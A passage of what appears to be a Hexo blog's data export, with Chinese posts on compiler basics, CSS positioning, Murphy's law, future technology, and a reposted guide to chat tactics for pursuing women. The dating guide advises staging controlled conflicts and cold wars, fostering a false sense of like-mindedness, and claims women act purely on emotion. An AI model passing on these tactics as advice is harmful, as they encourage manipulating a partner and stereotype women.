`C` 语言的编译器也是 `C` 语言，那它怎么被编译的？\n\n4. 目标文件的格式是什么样的，段表、符号表、重定位表有什么作用？\n\n5. `Swift` 是静态语言，为什么还有运行时库？\n\n6. 什么是 `ABI，ABI` 不稳定有什么问题？\n\n7. 什么是 `WebAssembly`，为什么要推出这门技术，用 `C++` 代替 `JavaScript` 可行么？\n\n8. `JavaScript` 和 `DOM API` 是什么关系，`JavaScript` 可以读写文件么？\n\n9.  `C++` 代码可以自动转换成 `Java` 代码么，任意两种语言是否可以互转？\n\n10. 为什么说 `Python` 是胶水语言，它可以用来开发 `iOS/Android` 么？  \n\n  \n[阅读原文](https://www.ctolib.com/topics-119548.html)\n\n---\n### 拓展阅读\n","slug":"基础编译原理和语言知识","published":1,"updated":"2018-09-05T06:33:18.513Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxri000nzodv5zoz1j2k","content":"<h2 id=\"基础编译原理和语言知识\"><a href=\"#基础编译原理和语言知识\" class=\"headerlink\" title=\"基础编译原理和语言知识\"></a>基础编译原理和语言知识</h2><p><code>think deeply</code>  </p>\n<ol>\n<li><p>什么是编译器，它以什么为分界线，分为前端和后端？      </p>\n<p> <a href=\"https://blog.csdn.net/sunxianghuang/article/details/52094859\" target=\"_blank\" rel=\"noopener\">JVM即时编译(JIT)</a></p>\n</li>\n<li><p><code>Java</code> 是编译型语言还是解释型语言，<code>Python</code> 呢？</p>\n</li>\n<li><p><code>C</code> 语言的编译器也是 <code>C</code> 语言，那它怎么被编译的？</p>\n</li>\n<li><p>目标文件的格式是什么样的，段表、符号表、重定位表有什么作用？</p>\n</li>\n<li><p><code>Swift</code> 是静态语言，为什么还有运行时库？</p>\n</li>\n<li><p>什么是 <code>ABI，ABI</code> 不稳定有什么问题？</p>\n</li>\n<li><p>什么是 <code>WebAssembly</code>，为什么要推出这门技术，用 <code>C++</code> 代替 <code>JavaScript</code> 可行么？</p>\n</li>\n<li><p><code>JavaScript</code> 和 <code>DOM API</code> 是什么关系，<code>JavaScript</code> 可以读写文件么？</p>\n</li>\n<li><p><code>C++</code> 代码可以自动转换成 <code>Java</code> 代码么，任意两种语言是否可以互转？</p>\n</li>\n<li><p>为什么说 <code>Python</code> 是胶水语言，它可以用来开发 <code>iOS/Android</code> 么？  </p>\n</li>\n</ol>\n<p><a href=\"https://www.ctolib.com/topics-119548.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n<hr>\n<h3 id=\"拓展阅读\"><a href=\"#拓展阅读\" class=\"headerlink\" title=\"拓展阅读\"></a>拓展阅读</h3>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"基础编译原理和语言知识\"><a href=\"#基础编译原理和语言知识\" class=\"headerlink\" title=\"基础编译原理和语言知识\"></a>基础编译原理和语言知识</h2><p><code>think deeply</code>  </p>\n<ol>\n<li><p>什么是编译器，它以什么为分界线，分为前端和后端？      </p>\n<p> <a href=\"https://blog.csdn.net/sunxianghuang/article/details/52094859\" target=\"_blank\" rel=\"noopener\">JVM即时编译(JIT)</a></p>\n</li>\n<li><p><code>Java</code> 是编译型语言还是解释型语言，<code>Python</code> 呢？</p>\n</li>\n<li><p><code>C</code> 语言的编译器也是 <code>C</code> 语言，那它怎么被编译的？</p>\n</li>\n<li><p>目标文件的格式是什么样的，段表、符号表、重定位表有什么作用？</p>\n</li>\n<li><p><code>Swift</code> 是静态语言，为什么还有运行时库？</p>\n</li>\n<li><p>什么是 <code>ABI，ABI</code> 不稳定有什么问题？</p>\n</li>\n<li><p>什么是 <code>WebAssembly</code>，为什么要推出这门技术，用 <code>C++</code> 代替 <code>JavaScript</code> 可行么？</p>\n</li>\n<li><p><code>JavaScript</code> 和 <code>DOM API</code> 是什么关系，<code>JavaScript</code> 可以读写文件么？</p>\n</li>\n<li><p><code>C++</code> 代码可以自动转换成 <code>Java</code> 代码么，任意两种语言是否可以互转？</p>\n</li>\n<li><p>为什么说 <code>Python</code> 是胶水语言，它可以用来开发 <code>iOS/Android</code> 么？  </p>\n</li>\n</ol>\n<p><a href=\"https://www.ctolib.com/topics-119548.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n<hr>\n<h3 id=\"拓展阅读\"><a href=\"#拓展阅读\" class=\"headerlink\" title=\"拓展阅读\"></a>拓展阅读</h3>"},{"title":"子元素居于父元素底部","date":"2018-05-18T06:45:26.000Z","_content":"只要父元素的`posiiton`设置为`relative`，子元素的位置就是相对于父元素的，这样设置子元素的`bottom`为`0`，即可将子元素置于父元素底部。\n````\n.parent{  \n    position: relative;  \n    width:200px;  \n    height: 100px;  \n    background: dodgerblue;  \n}  \n.content{  \n    position: absolute;  \n    width: 200px;  \n    height: 30px;  \n    background: orange;  \n    bottom: 0;  \n}  \n````","source":"_posts/子元素居于父元素底部.md","raw":"---\ntitle: 子元素居于父元素底部\ndate: 2018-05-18 14:45:26\ntags: 绝对定位\ncategories: CSS\n---\n只要父元素的`posiiton`设置为`relative`，子元素的位置就是相对于父元素的，这样设置子元素的`bottom`为`0`，即可将子元素置于父元素底部。\n````\n.parent{  \n    position: relative;  \n    width:200px;  \n    height: 100px;  \n    background: dodgerblue;  \n}  \n.content{  \n    position: absolute;  \n    width: 200px;  \n    height: 30px;  \n    background: orange;  \n    bottom: 0;  \n}  \n````","slug":"子元素居于父元素底部","published":1,"updated":"2018-09-05T06:33:18.514Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxrk000pzodv30gaemlz","content":"<p>只要父元素的<code>posiiton</code>设置为<code>relative</code>，子元素的位置就是相对于父元素的，这样设置子元素的<code>bottom</code>为<code>0</code>，即可将子元素置于父元素底部。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.parent&#123;  </span><br><span class=\"line\">    position: relative;  </span><br><span class=\"line\">    width:200px;  </span><br><span class=\"line\">    height: 100px;  </span><br><span class=\"line\">    background: dodgerblue;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">.content&#123;  </span><br><span class=\"line\">    position: absolute;  </span><br><span class=\"line\">    width: 200px;  </span><br><span class=\"line\">    height: 30px;  </span><br><span class=\"line\">    background: orange;  </span><br><span class=\"line\">    bottom: 0;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>只要父元素的<code>posiiton</code>设置为<code>relative</code>，子元素的位置就是相对于父元素的，这样设置子元素的<code>bottom</code>为<code>0</code>，即可将子元素置于父元素底部。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.parent&#123;  </span><br><span class=\"line\">    position: relative;  </span><br><span class=\"line\">    width:200px;  </span><br><span class=\"line\">    height: 100px;  </span><br><span class=\"line\">    background: dodgerblue;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">.content&#123;  </span><br><span class=\"line\">    position: absolute;  </span><br><span class=\"line\">    width: 200px;  </span><br><span class=\"line\">    height: 30px;  </span><br><span class=\"line\">    background: orange;  </span><br><span class=\"line\">    bottom: 0;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"墨菲法则","date":"2018-05-08T07:57:57.000Z","archives":"法则","_content":"## 凡是可能会出错的地方，一定会出错！—— 墨菲法则","source":"_posts/墨菲法则.md","raw":"---\ntitle: 墨菲法则\ndate: 2018-05-08 15:57:57\ntags: 座右铭系列\narchives: 法则\ncategories: 日常随笔\n---\n## 凡是可能会出错的地方，一定会出错！—— 墨菲法则","slug":"墨菲法则","published":1,"updated":"2018-09-05T06:33:18.513Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxrl000rzodvhny328sz","content":"<h2 id=\"凡是可能会出错的地方，一定会出错！——-墨菲法则\"><a href=\"#凡是可能会出错的地方，一定会出错！——-墨菲法则\" class=\"headerlink\" title=\"凡是可能会出错的地方，一定会出错！—— 墨菲法则\"></a>凡是可能会出错的地方，一定会出错！—— 墨菲法则</h2>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"凡是可能会出错的地方，一定会出错！——-墨菲法则\"><a href=\"#凡是可能会出错的地方，一定会出错！——-墨菲法则\" class=\"headerlink\" title=\"凡是可能会出错的地方，一定会出错！—— 墨菲法则\"></a>凡是可能会出错的地方，一定会出错！—— 墨菲法则</h2>"},{"title":"撩妹套路","date":"2018-05-07T05:46:33.000Z","archives":"撩妹套路","_content":"## 转载知乎[聊天套路](https://www.zhihu.com/question/47029505/answer/256114477)\n## 写在前面的话：\n聊天的确有套路，但套路也只是一套标准化的说法、技巧。应该学习套路的思想，拒绝照搬套路。只有真诚的付出，加上合理的聊天方式才是社交求偶的不二法门。\n\n从这篇我们能学到 寻找话题、把握交谈的节奏和时机，还有尊重女性。\n\n但这并不是一切，\n\n## 1.寻找切入话题\n通过头像、昵称、签名、空间动态、朋友圈、留言板等公开信息找到她的兴趣爱好、特别讨厌的事物、一些个人的小习惯。\n\n例一：你发现\\\n①：她喜欢听周杰伦。\\\n②：她喜欢听万青。\\\n③：她喜欢打羽毛球。\\\n④：她喜欢美剧。\\\n⑤：她讨厌鹿晗。\\\n⑥：她讨厌不清不楚的男女暧昧关系。\\\n⑦：她特别不喜欢吃菠萝。\\\n⑧：她有每天起床后喝一杯热水的习惯。\\\n⑨：她有每天晚上跑步的习惯。\n\n你会选择哪个话题切入呢？\\\n正确答案是②、④、⑥、⑧。\\\n前期话题切入优先选择小众或深度类、并形成“他乡遇故知”和“同仇敌忾”的局面。\n\n当然其它选项也不要忘了、在后期仍然有很大的用处。\n\n## 2.负起带节奏的重担\n①：`知识面`要广、不必什么都懂、但什么你都能说上两句。\\\n②：`有趣机智`、`脑回路清奇`以求`脱颖而出`、这里考验的是`段子储备`量和`临场反应`。烂大街的梗就不要用了、只会让你显得更加无趣。`前期`幽默的形式以自黑为主、`中后期`以黑她为主、当然是不伤大雅的那种黑。\\\n③：`前期`做一个合格的`捧哏`，不要喧宾夺主。当一个话题结束时，立刻从她的近几条消息中找到开始下一个话题的关键词，过渡要自然。`中后期`做一个合格的`逗哏`、不要冷场。可以开始分享自己有趣的故事了、但要注意观察对面的反应随时调整。\\\n④：拒绝`尬聊`。在发现话题进行不下去的时候、请找个`借口赶紧溜`了、再多说一句都可能会死。\\\n⑤：`换位思考`。你打出一行字后或准备说出一句话时、先把自己`带入`到她的位置、如果你发现这行字给人一种“不知道回复什么才好”的感觉、那么删了这行字、再打一行字并重复步骤。相信我、行云流水的聊天体验是每个人都喜欢的。\\\n⑥：`先人一步`。这个难度系数较高、首先要合理预测她对某事物的看法、在她没开口前、你先把这个看法说了。这个做法会形成“三观合、默契、偶遇知音”的假象。\\\n⑦：可以给她一个`专属代称`、就是只有你才会那么叫她的那种。\\\n⑧：从以前的聊天记录或面谈中找到几个`有趣的梗`、这些梗这么有意思千万不能浪费、放心重复吧、不会烂的。\\\n⑨：无论如何、一定要`尊重`她、开玩笑要懂得`分寸`、这是`底线`。\n\n## 3.控场\n①：表白不是冲锋的号角、而是胜利时的鸣金收兵。毕竟自古`表白多白表`、从来`姻缘少原因`。上来就说“我龙傲天从今天开始追你了”、你怕不是个傻子。\\\n②：`前期`你可以每天主动聊天、但到`中后期`一定要克制住自己冲动、等她来找你、如果她不主动、那就是你前面做的不够好。千万不能让她觉得你整天什么事没有、就知道和她扯淡。\\\n③：制造`完全可控`的小冲突小矛盾小冷战、把握好度、这个玩好了可以很快的提高感情基础。\\\n④：制造强烈反差对比、不是忽冷忽热、而是常态热偶尔冷。\n\n**例二**：\\\n一起出去玩，要`买水果`。路过菠萝的时候你可以不经意的说一句“我也不喜欢吃菠萝、不知道这反人类的东西为什么存在”。路过操场的时候你就可以说一句“真搞不懂这些人大晚上跑什么步、这明明是清晨做的事”。\n\n`心理距离`很重要、太冒进会容易让女生起戒备心。\n\n你只要一下走`进`了太多就一定要在合适的时候后`退`一点、一直走进会形成跪舔的局面、一直后退会让她觉得你是个傻逼。在来回踱步的过程中、你会惊奇的发现你们已经可以无话不说了、甚至距离近到只要一伸手、就可以抱到她。\n\n## 4.鸣金收兵\n女生以情绪为导向做出决定。\n\n一些小事往往是最能影响情绪的、别整天只顾着说情话、多做一点、她不瞎、都能看到的。\n\n直到有一天、她嘴里哼着“明明你也很爱我、没理由爱不到结果”、她其实还是不明白为什么爱不到结果。\n\n但这并不妨碍她在接下来的某个瞬间就变成了你的女朋友。她什么也没想、反正、跟着心情走、这就是女生。\n\n## 写在后面的话\n如果你已经追上心爱的女孩了。\n\n可你的噩梦才刚刚开始\n\n追女生容易, 经营、运行一段恋情走下去才是最难的。","source":"_posts/撩妹套路.md","raw":"---\ntitle: 撩妹套路\ndate: 2018-05-07 13:46:33\ntags: 感情\narchives: 撩妹套路\ncategories: 感情\n---\n## 转载知乎[聊天套路](https://www.zhihu.com/question/47029505/answer/256114477)\n## 写在前面的话：\n聊天的确有套路，但套路也只是一套标准化的说法、技巧。应该学习套路的思想，拒绝照搬套路。只有真诚的付出，加上合理的聊天方式才是社交求偶的不二法门。\n\n从这篇我们能学到 寻找话题、把握交谈的节奏和时机，还有尊重女性。\n\n但这并不是一切，\n\n## 1.寻找切入话题\n通过头像、昵称、签名、空间动态、朋友圈、留言板等公开信息找到她的兴趣爱好、特别讨厌的事物、一些个人的小习惯。\n\n例一：你发现\\\n①：她喜欢听周杰伦。\\\n②：她喜欢听万青。\\\n③：她喜欢打羽毛球。\\\n④：她喜欢美剧。\\\n⑤：她讨厌鹿晗。\\\n⑥：她讨厌不清不楚的男女暧昧关系。\\\n⑦：她特别不喜欢吃菠萝。\\\n⑧：她有每天起床后喝一杯热水的习惯。\\\n⑨：她有每天晚上跑步的习惯。\n\n你会选择哪个话题切入呢？\\\n正确答案是②、④、⑥、⑧。\\\n前期话题切入优先选择小众或深度类、并形成“他乡遇故知”和“同仇敌忾”的局面。\n\n当然其它选项也不要忘了、在后期仍然有很大的用处。\n\n## 2.负起带节奏的重担\n①：`知识面`要广、不必什么都懂、但什么你都能说上两句。\\\n②：`有趣机智`、`脑回路清奇`以求`脱颖而出`、这里考验的是`段子储备`量和`临场反应`。烂大街的梗就不要用了、只会让你显得更加无趣。`前期`幽默的形式以自黑为主、`中后期`以黑她为主、当然是不伤大雅的那种黑。\\\n③：`前期`做一个合格的`捧哏`，不要喧宾夺主。当一个话题结束时，立刻从她的近几条消息中找到开始下一个话题的关键词，过渡要自然。`中后期`做一个合格的`逗哏`、不要冷场。可以开始分享自己有趣的故事了、但要注意观察对面的反应随时调整。\\\n④：拒绝`尬聊`。在发现话题进行不下去的时候、请找个`借口赶紧溜`了、再多说一句都可能会死。\\\n⑤：`换位思考`。你打出一行字后或准备说出一句话时、先把自己`带入`到她的位置、如果你发现这行字给人一种“不知道回复什么才好”的感觉、那么删了这行字、再打一行字并重复步骤。相信我、行云流水的聊天体验是每个人都喜欢的。\\\n⑥：`先人一步`。这个难度系数较高、首先要合理预测她对某事物的看法、在她没开口前、你先把这个看法说了。这个做法会形成“三观合、默契、偶遇知音”的假象。\\\n⑦：可以给她一个`专属代称`、就是只有你才会那么叫她的那种。\\\n⑧：从以前的聊天记录或面谈中找到几个`有趣的梗`、这些梗这么有意思千万不能浪费、放心重复吧、不会烂的。\\\n⑨：无论如何、一定要`尊重`她、开玩笑要懂得`分寸`、这是`底线`。\n\n## 3.控场\n①：表白不是冲锋的号角、而是胜利时的鸣金收兵。毕竟自古`表白多白表`、从来`姻缘少原因`。上来就说“我龙傲天从今天开始追你了”、你怕不是个傻子。\\\n②：`前期`你可以每天主动聊天、但到`中后期`一定要克制住自己冲动、等她来找你、如果她不主动、那就是你前面做的不够好。千万不能让她觉得你整天什么事没有、就知道和她扯淡。\\\n③：制造`完全可控`的小冲突小矛盾小冷战、把握好度、这个玩好了可以很快的提高感情基础。\\\n④：制造强烈反差对比、不是忽冷忽热、而是常态热偶尔冷。\n\n**例二**：\\\n一起出去玩，要`买水果`。路过菠萝的时候你可以不经意的说一句“我也不喜欢吃菠萝、不知道这反人类的东西为什么存在”。路过操场的时候你就可以说一句“真搞不懂这些人大晚上跑什么步、这明明是清晨做的事”。\n\n`心理距离`很重要、太冒进会容易让女生起戒备心。\n\n你只要一下走`进`了太多就一定要在合适的时候后`退`一点、一直走进会形成跪舔的局面、一直后退会让她觉得你是个傻逼。在来回踱步的过程中、你会惊奇的发现你们已经可以无话不说了、甚至距离近到只要一伸手、就可以抱到她。\n\n## 4.鸣金收兵\n女生以情绪为导向做出决定。\n\n一些小事往往是最能影响情绪的、别整天只顾着说情话、多做一点、她不瞎、都能看到的。\n\n直到有一天、她嘴里哼着“明明你也很爱我、没理由爱不到结果”、她其实还是不明白为什么爱不到结果。\n\n但这并不妨碍她在接下来的某个瞬间就变成了你的女朋友。她什么也没想、反正、跟着心情走、这就是女生。\n\n## 写在后面的话\n如果你已经追上心爱的女孩了。\n\n可你的噩梦才刚刚开始\n\n追女生容易, 经营、运行一段恋情走下去才是最难的。","slug":"撩妹套路","published":1,"updated":"2018-09-05T06:33:18.514Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxrn000vzodv2213sy1n","content":"<h2 id=\"转载知乎聊天套路\"><a href=\"#转载知乎聊天套路\" class=\"headerlink\" title=\"转载知乎聊天套路\"></a>转载知乎<a href=\"https://www.zhihu.com/question/47029505/answer/256114477\" target=\"_blank\" rel=\"noopener\">聊天套路</a></h2><h2 id=\"写在前面的话：\"><a href=\"#写在前面的话：\" class=\"headerlink\" title=\"写在前面的话：\"></a>写在前面的话：</h2><p>聊天的确有套路，但套路也只是一套标准化的说法、技巧。应该学习套路的思想，拒绝照搬套路。只有真诚的付出，加上合理的聊天方式才是社交求偶的不二法门。</p>\n<p>从这篇我们能学到 寻找话题、把握交谈的节奏和时机，还有尊重女性。</p>\n<p>但这并不是一切，</p>\n<h2 id=\"1-寻找切入话题\"><a href=\"#1-寻找切入话题\" class=\"headerlink\" title=\"1.寻找切入话题\"></a>1.寻找切入话题</h2><p>通过头像、昵称、签名、空间动态、朋友圈、留言板等公开信息找到她的兴趣爱好、特别讨厌的事物、一些个人的小习惯。</p>\n<p>例一：你发现\\<br>①：她喜欢听周杰伦。\\<br>②：她喜欢听万青。\\<br>③：她喜欢打羽毛球。\\<br>④：她喜欢美剧。\\<br>⑤：她讨厌鹿晗。\\<br>⑥：她讨厌不清不楚的男女暧昧关系。\\<br>⑦：她特别不喜欢吃菠萝。\\<br>⑧：她有每天起床后喝一杯热水的习惯。\\<br>⑨：她有每天晚上跑步的习惯。</p>\n<p>你会选择哪个话题切入呢？\\<br>正确答案是②、④、⑥、⑧。\\<br>前期话题切入优先选择小众或深度类、并形成“他乡遇故知”和“同仇敌忾”的局面。</p>\n<p>当然其它选项也不要忘了、在后期仍然有很大的用处。</p>\n<h2 id=\"2-负起带节奏的重担\"><a href=\"#2-负起带节奏的重担\" class=\"headerlink\" title=\"2.负起带节奏的重担\"></a>2.负起带节奏的重担</h2><p>①：<code>知识面</code>要广、不必什么都懂、但什么你都能说上两句。\\<br>②：<code>有趣机智</code>、<code>脑回路清奇</code>以求<code>脱颖而出</code>、这里考验的是<code>段子储备</code>量和<code>临场反应</code>。烂大街的梗就不要用了、只会让你显得更加无趣。<code>前期</code>幽默的形式以自黑为主、<code>中后期</code>以黑她为主、当然是不伤大雅的那种黑。\\<br>③：<code>前期</code>做一个合格的<code>捧哏</code>，不要喧宾夺主。当一个话题结束时，立刻从她的近几条消息中找到开始下一个话题的关键词，过渡要自然。<code>中后期</code>做一个合格的<code>逗哏</code>、不要冷场。可以开始分享自己有趣的故事了、但要注意观察对面的反应随时调整。\\<br>④：拒绝<code>尬聊</code>。在发现话题进行不下去的时候、请找个<code>借口赶紧溜</code>了、再多说一句都可能会死。\\<br>⑤：<code>换位思考</code>。你打出一行字后或准备说出一句话时、先把自己<code>带入</code>到她的位置、如果你发现这行字给人一种“不知道回复什么才好”的感觉、那么删了这行字、再打一行字并重复步骤。相信我、行云流水的聊天体验是每个人都喜欢的。\\<br>⑥：<code>先人一步</code>。这个难度系数较高、首先要合理预测她对某事物的看法、在她没开口前、你先把这个看法说了。这个做法会形成“三观合、默契、偶遇知音”的假象。\\<br>⑦：可以给她一个<code>专属代称</code>、就是只有你才会那么叫她的那种。\\<br>⑧：从以前的聊天记录或面谈中找到几个<code>有趣的梗</code>、这些梗这么有意思千万不能浪费、放心重复吧、不会烂的。\\<br>⑨：无论如何、一定要<code>尊重</code>她、开玩笑要懂得<code>分寸</code>、这是<code>底线</code>。</p>\n<h2 id=\"3-控场\"><a href=\"#3-控场\" class=\"headerlink\" title=\"3.控场\"></a>3.控场</h2><p>①：表白不是冲锋的号角、而是胜利时的鸣金收兵。毕竟自古<code>表白多白表</code>、从来<code>姻缘少原因</code>。上来就说“我龙傲天从今天开始追你了”、你怕不是个傻子。\\<br>②：<code>前期</code>你可以每天主动聊天、但到<code>中后期</code>一定要克制住自己冲动、等她来找你、如果她不主动、那就是你前面做的不够好。千万不能让她觉得你整天什么事没有、就知道和她扯淡。\\<br>③：制造<code>完全可控</code>的小冲突小矛盾小冷战、把握好度、这个玩好了可以很快的提高感情基础。\\<br>④：制造强烈反差对比、不是忽冷忽热、而是常态热偶尔冷。</p>\n<p><strong>例二</strong>：\\<br>一起出去玩，要<code>买水果</code>。路过菠萝的时候你可以不经意的说一句“我也不喜欢吃菠萝、不知道这反人类的东西为什么存在”。路过操场的时候你就可以说一句“真搞不懂这些人大晚上跑什么步、这明明是清晨做的事”。</p>\n<p><code>心理距离</code>很重要、太冒进会容易让女生起戒备心。</p>\n<p>你只要一下走<code>进</code>了太多就一定要在合适的时候后<code>退</code>一点、一直走进会形成跪舔的局面、一直后退会让她觉得你是个傻逼。在来回踱步的过程中、你会惊奇的发现你们已经可以无话不说了、甚至距离近到只要一伸手、就可以抱到她。</p>\n<h2 id=\"4-鸣金收兵\"><a href=\"#4-鸣金收兵\" class=\"headerlink\" title=\"4.鸣金收兵\"></a>4.鸣金收兵</h2><p>女生以情绪为导向做出决定。</p>\n<p>一些小事往往是最能影响情绪的、别整天只顾着说情话、多做一点、她不瞎、都能看到的。</p>\n<p>直到有一天、她嘴里哼着“明明你也很爱我、没理由爱不到结果”、她其实还是不明白为什么爱不到结果。</p>\n<p>但这并不妨碍她在接下来的某个瞬间就变成了你的女朋友。她什么也没想、反正、跟着心情走、这就是女生。</p>\n<h2 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\"写在后面的话\"></a>写在后面的话</h2><p>如果你已经追上心爱的女孩了。</p>\n<p>可你的噩梦才刚刚开始</p>\n<p>追女生容易, 经营、运行一段恋情走下去才是最难的。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"转载知乎聊天套路\"><a href=\"#转载知乎聊天套路\" class=\"headerlink\" title=\"转载知乎聊天套路\"></a>转载知乎<a href=\"https://www.zhihu.com/question/47029505/answer/256114477\" target=\"_blank\" rel=\"noopener\">聊天套路</a></h2><h2 id=\"写在前面的话：\"><a href=\"#写在前面的话：\" class=\"headerlink\" title=\"写在前面的话：\"></a>写在前面的话：</h2><p>聊天的确有套路，但套路也只是一套标准化的说法、技巧。应该学习套路的思想，拒绝照搬套路。只有真诚的付出，加上合理的聊天方式才是社交求偶的不二法门。</p>\n<p>从这篇我们能学到 寻找话题、把握交谈的节奏和时机，还有尊重女性。</p>\n<p>但这并不是一切，</p>\n<h2 id=\"1-寻找切入话题\"><a href=\"#1-寻找切入话题\" class=\"headerlink\" title=\"1.寻找切入话题\"></a>1.寻找切入话题</h2><p>通过头像、昵称、签名、空间动态、朋友圈、留言板等公开信息找到她的兴趣爱好、特别讨厌的事物、一些个人的小习惯。</p>\n<p>例一：你发现\\<br>①：她喜欢听周杰伦。\\<br>②：她喜欢听万青。\\<br>③：她喜欢打羽毛球。\\<br>④：她喜欢美剧。\\<br>⑤：她讨厌鹿晗。\\<br>⑥：她讨厌不清不楚的男女暧昧关系。\\<br>⑦：她特别不喜欢吃菠萝。\\<br>⑧：她有每天起床后喝一杯热水的习惯。\\<br>⑨：她有每天晚上跑步的习惯。</p>\n<p>你会选择哪个话题切入呢？\\<br>正确答案是②、④、⑥、⑧。\\<br>前期话题切入优先选择小众或深度类、并形成“他乡遇故知”和“同仇敌忾”的局面。</p>\n<p>当然其它选项也不要忘了、在后期仍然有很大的用处。</p>\n<h2 id=\"2-负起带节奏的重担\"><a href=\"#2-负起带节奏的重担\" class=\"headerlink\" title=\"2.负起带节奏的重担\"></a>2.负起带节奏的重担</h2><p>①：<code>知识面</code>要广、不必什么都懂、但什么你都能说上两句。\\<br>②：<code>有趣机智</code>、<code>脑回路清奇</code>以求<code>脱颖而出</code>、这里考验的是<code>段子储备</code>量和<code>临场反应</code>。烂大街的梗就不要用了、只会让你显得更加无趣。<code>前期</code>幽默的形式以自黑为主、<code>中后期</code>以黑她为主、当然是不伤大雅的那种黑。\\<br>③：<code>前期</code>做一个合格的<code>捧哏</code>，不要喧宾夺主。当一个话题结束时，立刻从她的近几条消息中找到开始下一个话题的关键词，过渡要自然。<code>中后期</code>做一个合格的<code>逗哏</code>、不要冷场。可以开始分享自己有趣的故事了、但要注意观察对面的反应随时调整。\\<br>④：拒绝<code>尬聊</code>。在发现话题进行不下去的时候、请找个<code>借口赶紧溜</code>了、再多说一句都可能会死。\\<br>⑤：<code>换位思考</code>。你打出一行字后或准备说出一句话时、先把自己<code>带入</code>到她的位置、如果你发现这行字给人一种“不知道回复什么才好”的感觉、那么删了这行字、再打一行字并重复步骤。相信我、行云流水的聊天体验是每个人都喜欢的。\\<br>⑥：<code>先人一步</code>。这个难度系数较高、首先要合理预测她对某事物的看法、在她没开口前、你先把这个看法说了。这个做法会形成“三观合、默契、偶遇知音”的假象。\\<br>⑦：可以给她一个<code>专属代称</code>、就是只有你才会那么叫她的那种。\\<br>⑧：从以前的聊天记录或面谈中找到几个<code>有趣的梗</code>、这些梗这么有意思千万不能浪费、放心重复吧、不会烂的。\\<br>⑨：无论如何、一定要<code>尊重</code>她、开玩笑要懂得<code>分寸</code>、这是<code>底线</code>。</p>\n<h2 id=\"3-控场\"><a href=\"#3-控场\" class=\"headerlink\" title=\"3.控场\"></a>3.控场</h2><p>①：表白不是冲锋的号角、而是胜利时的鸣金收兵。毕竟自古<code>表白多白表</code>、从来<code>姻缘少原因</code>。上来就说“我龙傲天从今天开始追你了”、你怕不是个傻子。\\<br>②：<code>前期</code>你可以每天主动聊天、但到<code>中后期</code>一定要克制住自己冲动、等她来找你、如果她不主动、那就是你前面做的不够好。千万不能让她觉得你整天什么事没有、就知道和她扯淡。\\<br>③：制造<code>完全可控</code>的小冲突小矛盾小冷战、把握好度、这个玩好了可以很快的提高感情基础。\\<br>④：制造强烈反差对比、不是忽冷忽热、而是常态热偶尔冷。</p>\n<p><strong>例二</strong>：\\<br>一起出去玩，要<code>买水果</code>。路过菠萝的时候你可以不经意的说一句“我也不喜欢吃菠萝、不知道这反人类的东西为什么存在”。路过操场的时候你就可以说一句“真搞不懂这些人大晚上跑什么步、这明明是清晨做的事”。</p>\n<p><code>心理距离</code>很重要、太冒进会容易让女生起戒备心。</p>\n<p>你只要一下走<code>进</code>了太多就一定要在合适的时候后<code>退</code>一点、一直走进会形成跪舔的局面、一直后退会让她觉得你是个傻逼。在来回踱步的过程中、你会惊奇的发现你们已经可以无话不说了、甚至距离近到只要一伸手、就可以抱到她。</p>\n<h2 id=\"4-鸣金收兵\"><a href=\"#4-鸣金收兵\" class=\"headerlink\" title=\"4.鸣金收兵\"></a>4.鸣金收兵</h2><p>女生以情绪为导向做出决定。</p>\n<p>一些小事往往是最能影响情绪的、别整天只顾着说情话、多做一点、她不瞎、都能看到的。</p>\n<p>直到有一天、她嘴里哼着“明明你也很爱我、没理由爱不到结果”、她其实还是不明白为什么爱不到结果。</p>\n<p>但这并不妨碍她在接下来的某个瞬间就变成了你的女朋友。她什么也没想、反正、跟着心情走、这就是女生。</p>\n<h2 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\"写在后面的话\"></a>写在后面的话</h2><p>如果你已经追上心爱的女孩了。</p>\n<p>可你的噩梦才刚刚开始</p>\n<p>追女生容易, 经营、运行一段恋情走下去才是最难的。</p>\n"},{"title":"改变世界的想法","date":"2018-06-08T07:48:33.000Z","_content":"在当下的宇宙中，目前人类科技，两大难题。时间 和 空间\n\n改变世界的方法一：类似《头号玩家》的虚拟现实，解决 空间问题，缩短时间问题。\n\n具体技术：VR、人脸识别、微表情、触觉感应器\n\n改变世界的方法二：物理硬件 的飞行器。降低成本，解放人类空间自由度。\n\n","source":"_posts/改变世界的想法.md","raw":"---\ntitle: 改变世界的想法\ndate: 2018-06-08 15:48:33\ntags:\ncategories: Change the world\n---\n在当下的宇宙中，目前人类科技，两大难题。时间 和 空间\n\n改变世界的方法一：类似《头号玩家》的虚拟现实，解决 